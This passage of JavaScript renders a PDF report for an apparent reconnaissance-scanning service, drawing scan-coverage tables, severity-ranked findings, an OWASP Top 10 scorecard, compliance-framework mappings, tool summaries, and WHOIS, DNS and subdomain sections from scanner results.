    {tool:"cloudbuckets",name:"Cloud Bucket Finder",   isEmpty:d=>(!d.open_buckets||d.open_buckets.length===0) && (!d.existing_buckets||d.existing_buckets.length===0)},
    {tool:"secrets",     name:"JS Secret Scanner",     isEmpty:d=>!d.findings || d.findings.length===0},
    {tool:"asn",         name:"ASN / IP Ownership",    isEmpty:d=>!d.asn && !d.ip},
    {tool:"internetdb",  name:"Free Shodan (InternetDB)",isEmpty:d=>!d.found},
    {tool:"cve_match",   name:"CVE Matching (NVD)", isEmpty:d=>!d.summary || (d.summary.total_cves||0)===0},
    {tool:"subdomain_takeover", name:"Subdomain Takeover", isEmpty:d=>!d.vulnerable || d.vulnerable.length===0},
    {tool:"waf_cdn",     name:"WAF / CDN Fingerprint", isEmpty:d=>!d.detected || d.detected.length===0},
    {tool:"ssl_deep",    name:"SSL / TLS Deep Scan", isEmpty:d=>!d.vulnerabilities && !d.certificate},
  ];
  const _coverageRows = _PHASE_DEFS.map(p => {
    const d = r[p.tool];
    if (!d) return {...p, status:"NOT RUN",  detail:"Phase tile was deselected before this scan"};
    if (d._failed) return {...p, status:"FAILED", detail:String(d.error||"unknown error").substring(0,90)};
    if (d._skipped) return {...p, status:"SKIPPED",detail:String(d.skipped_reason||"skipped").substring(0,90)};
    if (d.skipped_reason) return {...p, status:"SKIPPED",detail:String(d.skipped_reason).substring(0,90)};
    if (p.isEmpty(d)) return {...p, status:"EMPTY",  detail:"Ran successfully — target returned no data for this check"};
    return {...p, status:"RAN", detail:_dynamicSummaryFor(p.tool, d)};
  });
  // Forward declaration of summary fn (used by both coverage + tools-used).
  // Function expression hoisted via let-binding shim so we can keep this
  // section above the Tools Used block.
  function _dynamicSummaryFor(tool, d) {
    d = d || {};
    switch(tool){
      case "whois":      return `Registrar: ${d.registrar || "n/a"}`;
      case "dns":        return `${(d.records||[]).length || Object.keys(d.records||{}).length} record(s)`;
      case "dnsrecon":   return `${(d.records||[]).length} DNS record(s)`;
      case "subdomains": return `${(d.subdomains||[]).length} subdomain(s)`;
      case "crtsh":      return `${d.total_subdomains || (d.subdomains||[]).length} from CT logs`;
      case "amass":      return `${(d.subdomains||[]).length} subdomain(s)`;
      case "harvester":  return `${(d.emails||[]).length}e · ${(d.hosts||[]).length}h`;
      case "shodan":     return `${(d.ports||[]).length} port(s), ${(d.vulns||[]).length} CVE(s)`;
      case "masscan":    return `${(d.ports||[]).length} open port(s)`;
      case "nmap":       return `${(d.ports||[]).length} open port(s)`;
      case "services":   return `${(d.ports||[]).length} service(s)`;
      case "os":         return (d.os || d.os_match || "OS detected").substring(0,60);
      case "banner":     return `${Object.keys(d.banners||{}).length} banner(s)`;
      case "gobuster":   return `${(d.found||[]).length} path(s)`;
      case "jsendpoints":return `${(d.paths||[]).length} path(s), ${(d.js_files||[]).length} JS file(s)`;
      case "wayback":    return `${d.total||0} archived · ${d.interesting_total||0} interesting`;
      case "robotsmap":  return `${(d.disallow||[]).length}d · ${(d.sitemap||[]).length}s · ${(d.well_known||[]).length}wk`;
      case "crawl":      return `${d.total||0} URLs crawled`;
      case "params":     return `${(d.params||[]).length} parameter(s)`;
      case "favicon":    return d.found ? `Hash ${d.shodan_hash}` : "no favicon";
      case "cloudbuckets":return `${(d.open_buckets||[]).length} OPEN · ${(d.existing_buckets||[]).length} existing`;
      case "secrets":    return `${(d.findings||[]).length} secret(s)`;
      case "asn":        return d.asn ? `AS${d.asn} — ${String(d.as_owner||"").substring(0,40)}` : "ASN done";
      case "internetdb": return d.found ? `${(d.ports||[]).length}p · ${(d.vulns||[]).length} CVE` : "no record";
      case "cve_match":  return d.summary ? `${d.summary.total_cves||0} CVE(s) · ${d.summary.critical_cves||0} critical · ${d.summary.high_cves||0} high` : "no match";
      case "subdomain_takeover": return (d.total_vulnerable||0) > 0 ? `${d.total_vulnerable} VULN takeover(s) on ${d.checked||0} subs` : `0 takeovers (${d.checked||0} subs checked)`;
      case "waf_cdn":    return (d.detected||[]).length > 0 ? `${(d.detected||[]).map(x=>x.vendor).slice(0,2).join(", ")}${d.detected.length>2?` +${d.detected.length-2}`:""}` : "none detected";
      case "ssl_deep":   return (d.total_vulnerabilities||0) > 0 ? `${d.total_vulnerabilities} TLS issue(s), ${d.current_protocol||"?"}` : `clean (${d.current_protocol||"?"})`;
      default:           return "Completed";
    }
  }
  // Tally + grade
  const _cnt = (s)=>_coverageRows.filter(p=>p.status===s).length;
  const _ran    = _cnt("RAN");
  const _empty  = _cnt("EMPTY");
  const _failed = _cnt("FAILED");
  const _skipped= _cnt("SKIPPED");
  const _notrun = _cnt("NOT RUN");
  const _completeness = _PHASE_DEFS.length - _notrun - _failed;
  const _covPct = Math.round(_completeness / _PHASE_DEFS.length * 100);
  const _covColor = _covPct >= 90 ? [15,118,82] : _covPct >= 70 ? [202,138,4] : [162,28,28];

  chk(85); y = sHead("Scan Coverage", y);
  fillR(margin, y, contentW, 16, LIGHT);
  fillR(margin, y, 4, 16, _covColor);
  doc.setFont("Arial","bold"); doc.setFontSize(22); doc.setTextColor(..._covColor);
  doc.text(`${_covPct}%`, margin+10, y+11);
  doc.setFont("Arial","bold"); doc.setFontSize(11); doc.setTextColor(...DARK);
  doc.text(`${_completeness}/${_PHASE_DEFS.length} phases completed cleanly`, margin+30, y+7);
  doc.setFont("Arial","normal"); doc.setFontSize(8); doc.setTextColor(...GRAY);
  doc.text(`${_ran} ran with data · ${_empty} empty · ${_failed} failed · ${_skipped} skipped · ${_notrun} not selected`, margin+30, y+12);
  y += 19;
  // Per-phase coverage table
  y = tHead(["PHASE","STATUS","DETAIL"],[55,25,100],y);
  _coverageRows.forEach((p,i)=>{
    const stColor = p.status==="RAN"     ? [15,118,82]
                  : p.status==="EMPTY"   ? [55,65,81]
                  : p.status==="FAILED"  ? [162,28,28]
                  : p.status==="SKIPPED" ? [120,53,15]
                  :                        [100,116,139];
    const stBg    = p.status==="RAN"     ? [220,252,231]
                  : p.status==="EMPTY"   ? [241,245,249]
                  : p.status==="FAILED"  ? [254,226,226]
                  : p.status==="SKIPPED" ? [254,243,199]
                  :                        [226,232,240];
    chk(7); fillR(margin, y, contentW, 6.5, i%2===0?LIGHT:WHITE);
    doc.setFont("Arial","normal"); doc.setFontSize(8); doc.setTextColor(...DARK);
    doc.text(p.name, margin+3, y+4.8);
    rrect(margin+58, y+1.5, 22, 5, 1, stBg);
    doc.setFont("Arial","bold"); doc.setFontSize(6.5); doc.setTextColor(...stColor);
    doc.text(p.status, margin+59.5, y+5);
    doc.setFont("Arial","normal"); doc.setFontSize(7.5); doc.setTextColor(...GRAY);
    doc.text(String(p.detail||"").substring(0,95), margin+84, y+4.8);
    y += 6.5;
  });
  y += 6;

  // ── Findings — synthesized severity-ranked actionable risks ──
  const _findings = synthesizeReconFindings(r);
  if (_findings.length > 0) {
    chk(40); y = sHead("Findings", y);
    const _sev = (s) => _findings.filter(f => f.severity === s).length;
    const _crit = _sev("CRITICAL"), _high = _sev("HIGH"), _med = _sev("MEDIUM"), _low = _sev("LOW");
    chk(10); fillR(margin, y, contentW, 9, LIGHT);
    txt(_findings.length + " finding(s)  -  " + _crit + " critical  -  " + _high + " high  -  " + _med + " medium  -  " + _low + " low",
        margin+4, y+6, 9, BLUE, true);
    y += 12;
    _findings.slice(0, 30).forEach((f, i) => {
      const sevColor = f.severity === "CRITICAL" ? [162,28,28]
                     : f.severity === "HIGH"     ? [194,65,12]
                     : f.severity === "MEDIUM"   ? [202,138,4]
                     : f.severity === "LOW"      ? [55,65,81]
                     :                              [100,116,139];
      const sevBg    = f.severity === "CRITICAL" ? [254,226,226]
                     : f.severity === "HIGH"     ? [255,237,213]
                     : f.severity === "MEDIUM"   ? [254,243,199]
                     : f.severity === "LOW"      ? [241,245,249]
                     :                              [226,232,240];
      chk(40);
      fillR(margin, y, contentW, 8, sevBg);
      fillR(margin, y, 3, 8, sevColor);
      doc.setFont("Arial","bold"); doc.setFontSize(9); doc.setTextColor.apply(doc, sevColor);
      const titleLines = doc.splitTextToSize((i+1) + ". " + f.title, 130);
      doc.text(titleLines[0] || "", margin+7, y+5.5);
      rrect(pageW-margin-30, y+1.5, 25, 5, 1, sevColor);
      doc.setFont("Arial","bold"); doc.setFontSize(6.5); doc.setTextColor(255,255,255);
      doc.text(f.severity + "  CVSS " + (f.cvss||"?"), pageW-margin-28, y+5);
      y += 9;
      doc.setFont("Arial","normal"); doc.setFontSize(8); doc.setTextColor.apply(doc, DARK);
      const descLines = doc.splitTextToSize(String(f.description||""), contentW-6);
      descLines.slice(0,3).forEach(line => {
        chk(5); doc.text(line, margin+4, y+3.5); y += 4;
      });
      if (f.evidence) {
        chk(5); fillR(margin, y, contentW, 4.5, [248,250,252]);
        doc.setFont("Arial","bold"); doc.setFontSize(7); doc.setTextColor.apply(doc, GRAY);
        doc.text("Evidence:", margin+4, y+3.2);
        doc.setFont("Courier","normal"); doc.setFontSize(7); doc.setTextColor.apply(doc, DARK);
        const evLines = doc.splitTextToSize(String(f.evidence), contentW-30);
        doc.text(evLines[0] || "", margin+22, y+3.2);
        y += 5;
      }
      if (f.remediation) {
        chk(5); fillR(margin, y, contentW, 4.5, [240,253,244]);
        doc.setFont("Arial","bold"); doc.setFontSize(7); doc.setTextColor(15,118,82);
        doc.text("Fix:", margin+4, y+3.2);
        doc.setFont("Arial","normal"); doc.setFontSize(7); doc.setTextColor.apply(doc, DARK);
        const remLines = doc.splitTextToSize(String(f.remediation), contentW-14);
        doc.text(remLines[0] || "", margin+13, y+3.2);
        y += 5;
      }
      if (f.references) {
        chk(4); doc.setFont("Arial","italic"); doc.setFontSize(6.5); doc.setTextColor.apply(doc, GRAY);
        doc.text("Refs: " + f.references, margin+4, y+3); y += 4;
      }
      y += 3;
    });
    if (_findings.length > 30) {
      chk(6); fillR(margin, y, contentW, 6, LIGHT);
      txt("... and " + (_findings.length-30) + " more findings (top 30 shown by severity)", margin+4, y+4.5, 7.5, GRAY);
      y += 7;
    }
    y += 4;
  }

  // ─── OWASP TOP 10 — 2021 COVERAGE SCORECARD (Recon) ───
  if (_findings && _findings.length > 0) {
    const _R_OWASP_2021 = [
      ["A01","Broken Access Control"],["A02","Cryptographic Failures"],
      ["A03","Injection"],["A04","Insecure Design"],
      ["A05","Security Misconfiguration"],["A06","Vulnerable & Outdated Components"],
      ["A07","Identification & Authentication Failures"],["A08","Software & Data Integrity Failures"],
      ["A09","Security Logging & Monitoring Failures"],["A10","Server-Side Request Forgery"]
    ];
    const _R_owaspMap = {};
    _R_OWASP_2021.forEach(([code]) => _R_owaspMap[code] = []);
    _findings.forEach(f => {
      const refs = String(f.references || "").toUpperCase();
      const m = refs.match(/A(\d{1,2})/);
      if (!m) return;
      const code = "A" + m[1].padStart(2, "0");
      if (_R_owaspMap[code]) _R_owaspMap[code].push(f);
    });
    const _R_failCats = _R_OWASP_2021.filter(([c]) => _R_owaspMap[c].length > 0).length;
    const _R_passCats = 10 - _R_failCats;
    const _R_grade = _R_passCats >= 9 ? "A" : _R_passCats >= 7 ? "B" : _R_passCats >= 5 ? "C" : _R_passCats >= 3 ? "D" : "F";
    const _R_gradeColor = _R_grade === "A" ? [15,118,82] : _R_grade === "B" ? [22,163,74] :
                          _R_grade === "C" ? [202,138,4] : _R_grade === "D" ? [194,65,12] : [162,28,28];
    chk(95); y += 2;
    y = sHead("OWASP Top 10 — 2021 Coverage (Recon)", y);
    fillR(margin, y, contentW, 16, LIGHT);
    fillR(margin, y, 4, 16, _R_gradeColor);
    doc.setFont("Arial","bold"); doc.setFontSize(22); doc.setTextColor.apply(doc, _R_gradeColor);
    doc.text(_R_grade, margin+10, y+11);
    doc.setFont("Arial","bold"); doc.setFontSize(12); doc.setTextColor.apply(doc, DARK);
    doc.text(`${_R_passCats}/10 OWASP categories passing`, margin+28, y+7);
    doc.setFont("Arial","normal"); doc.setFontSize(8); doc.setTextColor.apply(doc, GRAY);
    doc.text(_R_failCats === 0 ? "All 10 clear — strong recon posture." : `${_R_failCats} category(ies) failing.`, margin+28, y+12);
    y += 19;
    y = tHead(["CATEGORY","NAME","STATUS","BREAKDOWN"],[20,82,22,56],y);
    _R_OWASP_2021.forEach(([code, name], i) => {
      const matches = _R_owaspMap[code];
      const passing = matches.length === 0;
      chk(9);
      fillR(margin, y, contentW, 8, i%2===0 ? LIGHT : WHITE);
      fillR(margin, y, 1.5, 8, passing ? [15,118,82] : [162,28,28]);
      doc.setFont("Arial","bold"); doc.setFontSize(8.5); doc.setTextColor.apply(doc, DARK);
      doc.text(code+":2021", margin+4, y+5.5);
      doc.setFont("Arial","normal"); doc.setFontSize(8);
      doc.text(name, margin+24, y+5.5);
      const stBg = passing ? [220,252,231] : [254,226,226];
      const stFg = passing ? [15,118,82] : [162,28,28];
      rrect(margin+106, y+1.5, 18, 5, 1, stBg);
      doc.setFont("Arial","bold"); doc.setFontSize(7); doc.setTextColor.apply(doc, stFg);
      doc.text(passing ? "PASS" : "FAIL", margin+(passing?112:111.5), y+5);
      if (passing) {
        doc.setFont("Arial","italic"); doc.setFontSize(7.5); doc.setTextColor(15,118,82);
        doc.text("No findings in this category", margin+128, y+5.5);
      } else {
        const _sc = {CRITICAL:0,HIGH:0,MEDIUM:0,LOW:0};
        matches.forEach(f => { if (_sc[f.severity] !== undefined) _sc[f.severity]++; });
        const parts = ["CRITICAL","HIGH","MEDIUM","LOW"].filter(s => _sc[s] > 0).map(s => `${_sc[s]} ${s}`);
        doc.setFont("Arial","normal"); doc.setFontSize(7.5); doc.setTextColor.apply(doc, GRAY);
        doc.text(parts.join(" · ") || `${matches.length} finding(s)`, margin+128, y+5.5);
      }
      y += 8;
    });
    y += 5;

    // Compliance Coverage — 8 frameworks
    const _R_CWE_MAP = {
      "CWE-79":["6.2.4 / 6.4.1","CC6.6","A.8.28","SI-10","164.312(a)(1)","Art. 32 / 25","PR.IP-2","CIS 16.10"],
      "CWE-89":["6.2.4 / 6.4.1","CC6.6","A.8.28","SI-10 / AC-3","164.312(a)(1)","Art. 32 / 25","PR.DS-5","CIS 16.10"],
      "CWE-200":["3.4.1","CC6.1","A.5.10","SC-8 / AC-3","164.312(e)(1)","Art. 32 / 33","PR.DS-1","CIS 3.3"],
      "CWE-319":["4.2.1","CC6.7","A.8.24","SC-8 / SC-13","164.312(e)(1)","Art. 32","PR.DS-2","CIS 3.10"],
      "CWE-538":["2.2.7 / 6.4.1","CC6.1","A.5.10","AC-3 / AC-6","164.312(a)(1)","Art. 32","PR.DS-1","CIS 3.7"],
      "CWE-693":["6.2.4","CC6.6","A.8.23","SC-7 / SI-10","164.312(a)(1)","Art. 32","PR.IP-1","CIS 16.10"],
      "CWE-1021":["6.4.3","CC6.6","A.8.23","SC-7","164.312(a)(1)","Art. 32","PR.AC-5","CIS 16.10"],
      "CWE-1395":["6.3.3 / 6.5.6","CC7.1","A.8.8","SI-2 / RA-5","164.308(a)(5)","Art. 32","ID.RA-1","CIS 7.1"],
      "CWE-942":["6.2.4 / 6.4.1","CC6.6","A.8.23","SC-7 / AC-3","164.312(a)(1)","Art. 32","PR.AC-5","CIS 16.10"],
      "CWE-22":["6.2.4 / 6.4.1","CC6.6","A.8.28","SI-10 / AC-3","164.312(a)(1)","Art. 32 / 25","PR.AC-4","CIS 16.10"],
      "CWE-601":["6.2.4","CC6.6","A.8.21","SI-10 / SC-7","164.312(a)(1)","Art. 32","PR.IP-2","CIS 16.10"],
      "CWE-918":["6.2.4","CC6.6","A.8.23","SC-7 / SI-10","164.312(a)(1)","Art. 32","PR.AC-5","CIS 16.10"],
      "CWE-352":["6.2.4","CC6.1","A.5.15","SC-23","164.312(d)","Art. 32","PR.AC-7","CIS 16.5"],
      "CWE-287":["7.2 / 8.2","CC6.1","A.5.15","IA-2 / AC-7","164.312(d)","Art. 32 / 25","PR.AC-1","CIS 6.3"],
    };
    const _R_FW = [
      {n:"PCI-DSS v4.0",            b:"Payment Card Industry — Req 6/8"},
      {n:"SOC 2 (Trust Services)",  b:"AICPA Common Criteria — CC6"},
      {n:"ISO 27001:2022",          b:"Annex A.5/8/14 (Org, People, Tech)"},
      {n:"NIST 800-53 Rev 5",       b:"US federal controls — SI/SC/AC/IA"},
      {n:"HIPAA Security Rule",     b:"45 CFR 164.308/312"},
      {n:"GDPR",                    b:"Art. 32 (security), 25 (by-design), 33"},
      {n:"NIST CSF 2.0",            b:"IDENTIFY/PROTECT/DETECT/RESPOND"},
      {n:"CIS Controls v8",         b:"18 critical controls"},
    ];
    const _R_SEV_BG = {CRITICAL:[254,226,226],HIGH:[255,237,213],MEDIUM:[254,252,232],LOW:[220,252,231]};
    const _R_SEV_TX = {CRITICAL:[162,28,28],HIGH:[194,65,12],MEDIUM:[133,79,11],LOW:[15,118,82]};
    const _R_sevRank = {CRITICAL:0,HIGH:1,MEDIUM:2,LOW:3,INFO:4};
    const _R_fwMaps = _R_FW.map(() => new Map());
    const _R_pushC = (m, ctrl, f) => {
      if (!ctrl) return;
      ctrl.split(/\s*\/\s*/).forEach(c => { if (!m.has(c)) m.set(c, []); m.get(c).push(f); });
    };
    _findings.forEach(f => {
      const refs = String(f.references || "");
      const cweMatch = refs.match(/CWE-\d+/i);
      if (!cweMatch) return;
      const cwe = cweMatch[0].toUpperCase();
      const map = _R_CWE_MAP[cwe];
      if (!map) return;
      _R_FW.forEach((fw, i) => _R_pushC(_R_fwMaps[i], map[i], f));
    });
    if (_R_fwMaps.some(m => m.size > 0)) {
      chk(70); y += 2;
      y = sHead("Compliance Coverage — 8 Frameworks (Recon)", y);
      doc.setFont("Arial","italic"); doc.setFontSize(7); doc.setTextColor.apply(doc, GRAY);
      doc.text("Recon-side findings mapped onto PCI-DSS, SOC 2, ISO 27001, NIST 800-53, HIPAA, GDPR, NIST CSF, CIS v8.", margin+2, y);
      doc.setFont("Arial","normal");
      y += 4;
      const _R_renderFw = (name, blurb, controlsMap) => {
        if (controlsMap.size === 0) return;
        chk(controlsMap.size * 7 + 14);
        fillR(margin, y, contentW, 7, [30,64,175]);
        doc.setFont("Arial","bold"); doc.setFontSize(8.5); doc.setTextColor(255,255,255);
        doc.text(name, margin+3, y+5);
        doc.setFont("Arial","normal"); doc.setFontSize(7); doc.setTextColor(218,234,254);
        doc.text(blurb, margin+62, y+5);
        doc.setFont("Arial","bold"); doc.setFontSize(7); doc.setTextColor(255,255,255);
        doc.text(`${controlsMap.size} control(s) impacted`, pageW-margin-3, y+5, {align:"right"});
        y += 7;
        Array.from(controlsMap.entries()).sort((a,b)=>b[1].length - a[1].length).forEach(([ctrl, fs], i) => {
          chk(7);
          fillR(margin, y, contentW, 6.5, i%2===0 ? LIGHT : WHITE);
          fillR(margin, y, 1.5, 6.5, [162,28,28]);
          doc.setFont("Arial","bold"); doc.setFontSize(8); doc.setTextColor.apply(doc, DARK);
          doc.text(ctrl, margin+4, y+4.5);
          const sortedFs = [...fs].sort((a,b) => (_R_sevRank[a.severity]??9) - (_R_sevRank[b.severity]??9));
          const worst = sortedFs[0].severity || "LOW";
          rrect(margin+50, y+1.5, 18, 5, 1, _R_SEV_BG[worst] || _R_SEV_BG.LOW);
          doc.setFont("Arial","bold"); doc.setFontSize(6.5); doc.setTextColor.apply(doc, (_R_SEV_TX[worst] || _R_SEV_TX.LOW));
          doc.text(worst, margin+51, y+5);
          const uniqueTitles = [...new Set(sortedFs.map(f => (f.title || f.description || "").trim()))].filter(Boolean);
          const sample = uniqueTitles.length === 1 ? uniqueTitles[0].substring(0, 80) : `${uniqueTitles[0].substring(0, 60)} (+${uniqueTitles.length-1} more)`;
          doc.setFont("Arial","normal"); doc.setFontSize(7.5); doc.setTextColor.apply(doc, GRAY);
          doc.text(`${fs.length} finding(s): ${sample}`, margin+72, y+4.5);
          y += 6.5;
        });
        y += 4;
      };
      _R_FW.forEach((fw, i) => _R_renderFw(fw.n, fw.b, _R_fwMaps[i]));
    }
  }

  // Tools used — show real, data-driven summaries instead of generic
  // "Completed". Each summary pulls the actual count/value from the
  // scanner's response so the customer sees what was discovered.
  const toolsRun = Object.keys(r).filter(k=>r[k]);
  if(toolsRun.length>0){
    y = sHead("Tools Used",y);
    y = tHead(["TOOL","RESULT SUMMARY"],[50,130],y);
    const _dynamicSummary = (tool) => {
      const d = r[tool] || {};
      switch(tool){
        case "whois":      return `Registrar: ${d.registrar || "n/a"}`;
        case "dns":        return `${(d.records||[]).length || Object.keys(d.records||{}).length} record(s) (A/MX/NS/TXT/CNAME/SOA)`;
        case "dnsrecon":   return `${(d.records||[]).length} DNS record(s)`;
        case "subdomains": return `${(d.subdomains||[]).length} subdomain(s) discovered`;
        case "crtsh":      return `${d.total_subdomains || (d.subdomains||[]).length} subdomain(s) from CT logs`;
        case "amass":      return `${(d.subdomains||[]).length} subdomain(s) (deep enum)`;
        case "harvester":  return `${(d.emails||[]).length} emails · ${(d.hosts||[]).length} hosts`;
        case "shodan":     return d.error ? `Shodan API error — ${String(d.error).substring(0,60)}` : `${(d.ports||[]).length} port(s), ${(d.vulns||[]).length} CVE(s)`;
        case "masscan":    return `${(d.ports||[]).length} open port(s)`;
        case "nmap":       return `${(d.ports||[]).length} open port(s)` + (d.banner ? ` · ${String(d.banner).substring(0,40)}` : "");
        case "services":   return `${(d.ports||[]).length} service(s) detected`;
        case "os":         return d.os || d.os_match || "OS detection completed";
        case "banner":     return `${Object.keys(d.banners||{}).length} banner(s) grabbed`;
        case "gobuster":   return `${(d.found||[]).length} path(s) discovered`;
        case "jsendpoints":return `${(d.paths||[]).length} endpoint(s) across ${(d.js_files||[]).length} JS file(s)`;
        case "wayback":    return `${d.total||0} archived URL(s) · ${d.interesting_total||0} interesting`;
        case "robotsmap":  return `${(d.disallow||[]).length} disallow · ${(d.sitemap||[]).length} sitemap · ${(d.well_known||[]).length} well-known`;
        case "crawl":      return `${d.total||0} URL(s) crawled · ${d.interesting_total||0} interesting`;
        case "params":     return `${(d.params||[]).length} parameter(s) discovered`;
        case "favicon":    return d.found ? `Hash ${d.shodan_hash} · ${d.matched_service || "unknown service"}` : (d.skipped_reason || "No favicon");
        case "cloudbuckets":return `${(d.open_buckets||[]).length} OPEN · ${(d.existing_buckets||[]).length} existing bucket(s)`;
        case "secrets":    return `${(d.findings||[]).length} secret(s) across ${(d.js_files||[]).length} JS file(s)`;
        case "asn":        return d.asn ? `AS${d.asn} — ${(d.as_owner||"").substring(0,50)} (${d.country||"?"})` : "ASN lookup completed";
        case "internetdb": return d.found ? `${(d.ports||[]).length} port(s) · ${(d.vulns||[]).length} CVE(s) · ${(d.tags||[]).length} tag(s)` : (d.skipped_reason || "No Shodan record");
        case "cve_match":  return d.summary ? `${d.summary.total_cves||0} CVE(s) found · ${d.summary.critical_cves||0} critical · ${d.summary.high_cves||0} high · ${d.summary.medium_cves||0} medium` : (d.skipped_reason || "No CVEs matched");
        case "subdomain_takeover": return (d.total_vulnerable||0) > 0 ? `${d.total_vulnerable} takeover-vulnerable subdomain(s) on ${d.checked||0} checked` : `${d.checked||0} subdomain(s) checked, none vulnerable`;
        default:           return "Completed";
      }
    };
    // Group rows so the table doesn't leave a single orphan row floating
    // on the next page after a page-break — pre-measure remaining height
    // and start a fresh page if we have less than 4 rows of space.
    if(toolsRun.length>0){
      const remaining = 285 - y;
      const rowsThatFit = Math.floor(remaining / 7);
      if(rowsThatFit < Math.min(toolsRun.length, 4)){
        doc.addPage(); y=18; drawHeader();
        y = sHead("Tools Used (cont.)",y);
        y = tHead(["TOOL","RESULT SUMMARY"],[50,130],y);
      }
    }
    toolsRun.forEach((tool,i)=>{
      const summary = _dynamicSummary(tool);
      chk(7);
      fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE);
      txt(tool,margin+3,y+5,8,BLUE,true);
      // Wrap long summaries — some (e.g. asn AS owner) push the 130mm column
      const sLines = doc.splitTextToSize(String(summary), 128);
      doc.setFont("Arial","normal"); doc.setFontSize(8); doc.setTextColor(...DARK);
      doc.text(sLines[0] || "", margin+53, y+5);
      y+=7;
    });
    y+=8;
  }

  doc.addPage(); y=18; drawHeader();

  // ── WHOIS ──────────────────────────────────────────────────
  if(r.whois){ chk(30); y = sHead("WHOIS Lookup",y);
    const fields=[["Domain",r.whois.domain],["Registrar",r.whois.registrar],["Created",r.whois.created],["Expires",r.whois.expires],["Country",r.whois.country],["Name Servers",(r.whois.name_servers||[]).join(", ")]].filter(([,v])=>v);
    y = tHead(["FIELD","VALUE"],[45,135],y);
    fields.forEach((f,i)=>{ chk(7); fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE); txt(f[0],margin+3,y+5,8.5,GRAY,true); const vl=doc.splitTextToSize(String(f[1]),128); doc.setFont("Arial","normal");doc.setFontSize(8.5);doc.setTextColor(...DARK);doc.text(vl[0],margin+48,y+5); y+=7; });
    y+=6; }

  // ── DNS ────────────────────────────────────────────────────
  // Backend returns records as an ARRAY of {type, value} objects.
  // Older callers may pass an OBJECT keyed by record type ({A:[...], MX:[...]}) —
  // we normalize both into the same array shape so the rendered TYPE column
  // always shows "A/MX/NS/TXT" and never the array index.
  if(r.dns){ chk(30); y = sHead("DNS Records",y);
    const raw = r.dns.records;
    let recArray = [];
    if(Array.isArray(raw)){
      recArray = raw.map(rec => ({
        type:  String(rec?.type || "?"),
        value: rec?.value ?? rec?.address ?? rec?.exchange ?? rec?.data ?? rec,
      }));
    } else if(raw && typeof raw === "object"){
      recArray = Object.entries(raw).flatMap(([t, vals]) =>
        (Array.isArray(vals) ? vals : [vals]).map(v => ({type: t, value: v}))
      );
    }
    if(recArray.length > 0){
      y = tHead(["TYPE","RECORD"],[25,155],y);
      recArray.forEach((rec, i) => {
        const t = rec.type || "?";
        const v = rec.value;
        const vStr = (typeof v === "object" && v !== null)
          ? (v.address || v.exchange || v.value || v.data || JSON.stringify(v))
          : String(v || "");
        chk(7);
        fillR(margin, y, contentW, 7, i % 2 === 0 ? LIGHT : WHITE);
        rrect(margin+3, y+1.5, 18, 4, 1, [219,234,254]);
        doc.setFont("Arial","bold"); doc.setFontSize(7); doc.setTextColor(30,64,175);
        doc.text(t, margin+5, y+5);
        const vl = doc.splitTextToSize(vStr, 148);
        doc.setFont("Arial","normal"); doc.setFontSize(8); doc.setTextColor(...DARK);
        doc.text(vl[0], margin+28, y+5);
        y += 7;
      });
    } else {
      fillR(margin,y,contentW,8,LIGHT);
      txt("No DNS records found for this target (private/local IP).", margin+4, y+5.5, 8.5, GRAY);
      y += 10;
    }
    y += 6; }

  // ── DNS Recon ──────────────────────────────────────────────
  // Long TXT records (SPF, domain-verification, BIMI) are too wide for a
  // single 45-char cell — wrap with splitTextToSize so the customer sees
  // the FULL value, not "openai-domain-verification=dv-aadifDyfGx0jGv"
  // cut off mid-string.
  if(r.dnsrecon && r.dnsrecon.records && r.dnsrecon.records.length>0){
    chk(30); y = sHead("DNS Reconnaissance (dnsrecon)", y);
    y = tHead(["TYPE","NAME","ADDRESS / VALUE"], [22, 55, contentW-77], y);
    r.dnsrecon.records.slice(0, 80).forEach((rec, i) => {
      const addrStr = String(rec.address || rec.value || "").replace(/^"|"$/g, "").trim();
      const addrLines = doc.splitTextToSize(addrStr, contentW - 80);
      const rowH = Math.max(7, addrLines.length * 3.8 + 3);
      chk(rowH + 2);
      fillR(margin, y, contentW, rowH, i % 2 === 0 ? LIGHT : WHITE);
      rrect(margin+3, y+1.5, 18, 4, 1, [219, 234, 254]);
      doc.setFont("Arial","bold"); doc.setFontSize(7); doc.setTextColor(30, 64, 175);
      doc.text(String(rec.type || "?"), margin+5, y+5);
      doc.setFont("Arial","normal"); doc.setFontSize(7.5); doc.setTextColor(...DARK);
      doc.text(String(rec.name || "").substring(0, 28), margin+25, y+5);
      doc.setFont("Courier","normal"); doc.setFontSize(7); doc.setTextColor(...GRAY);
      doc.text(addrLines, margin+78, y+5);
      y += rowH;
    });
    if(r.dnsrecon.records.length > 80){
      chk(7); fillR(margin, y, contentW, 7, LIGHT);
      txt("... and " + (r.dnsrecon.records.length-80) + " more records", margin+4, y+5, 8, GRAY);
      y += 7;
    }
    y += 6;
  }

  // ── Subdomains ─────────────────────────────────────────────
  const allSubs = [...new Set([...(r.subdomains?.subdomains||[]),...(r.crtsh?.subdomains||[]),...(r.amass?.subdomains||[])])];
  if(allSubs.length>0){ chk(30); y = sHead("Subdomain Enumeration",y);
    y = tHead(["SUBDOMAIN","SOURCE"],[120,60],y);
    const subSrc={};
    (r.subdomains?.subdomains||[]).forEach(s=>subSrc[s]="sublist3r");
    (r.crtsh?.subdomains||[]).forEach(s=>subSrc[s]=subSrc[s]?"multiple":"crt.sh");
    (r.amass?.subdomains||[]).forEach(s=>subSrc[s]=subSrc[s]?"multiple":"amass");
    allSubs.slice(0,50).forEach((s,i)=>{ chk(7); fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE); doc.setFont("Arial","normal");doc.setFontSize(8);doc.setTextColor(59,130,246);doc.text(String(s).substring(0,55),margin+3,y+5); txt(subSrc[s]||"—",margin+123,y+5,7.5,GRAY); y+=7; });
    if(allSubs.length>50){ fillR(margin,y,contentW,7,LIGHT); txt("... and "+(allSubs.length-50)+" more subdomains",margin+4,y+5,8,GRAY); y+=7; }
    y+=6; }

  // ── Cert Transparency (crt.sh) ─────────────────────────────
  // Surfaces the certificate metadata that drives subdomain discovery —
  // total certs seen, who issued them, and the date range. Useful for the
  // customer to understand "where did all these subdomains come from?"
  if(r.crtsh && (r.crtsh.certs_seen > 0 || (r.crtsh.top_issuers||[]).length > 0)){
    chk(30); y = sHead("Certificate Transparency (crt.sh)", y);
    if(r.crtsh.error){
      fillR(margin, y, contentW, 7, [254, 226, 226]);
      txt("crt.sh issue: " + r.crtsh.error, margin+4, y+5, 8, [162,28,28]);
      y += 9;
    }
    const ctRows = [
